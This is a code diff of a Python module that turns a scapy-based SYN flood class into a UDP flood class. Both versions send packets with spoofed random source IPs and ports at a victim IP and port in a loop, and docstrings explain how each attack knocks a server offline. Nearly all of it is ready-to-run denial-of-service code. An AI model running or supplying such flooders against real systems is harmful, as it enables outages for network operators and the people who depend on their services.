@@ -14,14 +14,15 @@
 #
 # Written by:
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
-"""The module for SYN flood class"""
+"""The module for UDP flood class"""
 
 
 import sys
-import textwrap
+
+# import socket
 import logging
-from random import randint
-from scapy.all import IP, TCP, send  # pylint: disable=E0401,E0611
+import textwrap
+from scapy.all import IP, UDP, send  # pylint: disable=E0401,E0611
 
 from .helpers import (
     random_IP,
@@ -35,12 +36,12 @@ from .helpers import (
 _LOGGER = logging.getLogger(__name__)
 
 
-class SYNFlooder:  # pylint: disable=R0903
-    """A class that represents a SYN flood attack"""
+class UDPFlooder:  # pylint: disable=R0903
+    """A class that represents a UDP flood attack"""
 
     def __init__(self, dst_ip, dst_port, count):
         """
-        Initialaze a SYN flood object
+        Initialaze a UDP flood object
 
         :dst_ip: the victim's IP
         :dst_port: the victim's port
@@ -53,22 +54,29 @@ class SYNFlooder:  # pylint: disable=R0903
             self.count = int(count)
         if dst_ip and dst_port and count:
             _LOGGER.debug(
-                "Creating a SYNFlooder object with destination IP %s"
+                "Creating a UDPFlooder object with destination IP %s"
                 " and destination port %i",
                 self.dst_ip,
                 self.dst_port,
             )
         self.description = textwrap.dedent(
             """\
-            The SYN flood attack description:
+            A UDP flood attack is a volumetric denial-of-service (DoS)
+            attack using the User Datagram Protocol (UDP), a
+            sessionless/connectionless computer networking protocol.
 
-            A SYN flood is a form of denial-of-service attack in which
-            an attacker rapidly initiates a connection to a server without
-            finalizing the connection. The server has to spend resources
-            waiting for half-opened connections, which can consume enough
-            resources to make the system unresponsive to legitimate traffic.
+            A UDP flood attack can be initiated by sending a large number
+            of UDP packets to random ports on a remote host. As a result,
+            the distant host will:
+              - Check for the application listening at that port;
+              - See that no application listens at that port;
+              - Reply with an ICMP Destination Unreachable packet.
 
-            Read more: https://www.wikiwand.com/en/SYN_flood
+            Thus, for a large number of UDP packets, the victimized system
+            will be forced into sending many ICMP packets, eventually leading
+            it to be unreachable by other clients.
+
+            Read more: https://www.wikiwand.com/en/UDP_flood
             """
         )
 
@@ -79,15 +87,12 @@ class SYNFlooder:  # pylint: disable=R0903
         IP_Packet.dst = self.dst_ip
         return IP_Packet
 
-    def _create_tcp_packet(self):
-        """Create a TCP packet with random source port"""
-        TCP_Packet = TCP()  # pylint: disable=C0103
-        TCP_Packet.sport = random_port()
-        TCP_Packet.dport = self.dst_port
-        TCP_Packet.flags = "S"
-        TCP_Packet.seq = randint(1000, 9000)
-        TCP_Packet.window = randint(1000, 9000)
-        return TCP_Packet
+    def _create_udp_packet(self):
+        """Create a UDP packet with random source port"""
+        UDP_Packet = UDP()  # pylint: disable=C0103
+        UDP_Packet.sport = random_port()
+        UDP_Packet.dport = self.dst_port
+        return UDP_Packet
 
     def run(self):
         """
@@ -106,20 +111,20 @@ class SYNFlooder:  # pylint: disable=R0903
                 # Ether_Frame = Ether()
                 # Ether_Frame.scr = randomMAC()
                 IP_Packet = self._create_ip_packet()  # pylint: disable=C0103
-                TCP_Packet = self._create_tcp_packet()  # pylint: disable=C0103
-                send(IP_Packet / TCP_Packet, verbose=0)
+                UDP_Packet = self._create_udp_packet()  # pylint: disable=C0103
+                send(IP_Packet / UDP_Packet, verbose=0)
                 _LOGGER.debug(
                     "Sending a packet #%i with <source_IP>:<source_port>"
                     " %s:%s",
-                    x,
+                    x + 1,
                     IP_Packet.src,
-                    TCP_Packet.sport,
+                    UDP_Packet.sport,
                 )
                 progress_bar(x, self.count)
                 total += 1
             except KeyboardInterrupt:
                 _LOGGER.info("\nTotal packets sent: %i\n", total)
-                _LOGGER.warning("\nStopping SYN flood attack")
+                _LOGGER.warning("\nStopping UDP flood attack")
                 sys.exit(0)
 
         progress_bar(self.count, self.count)
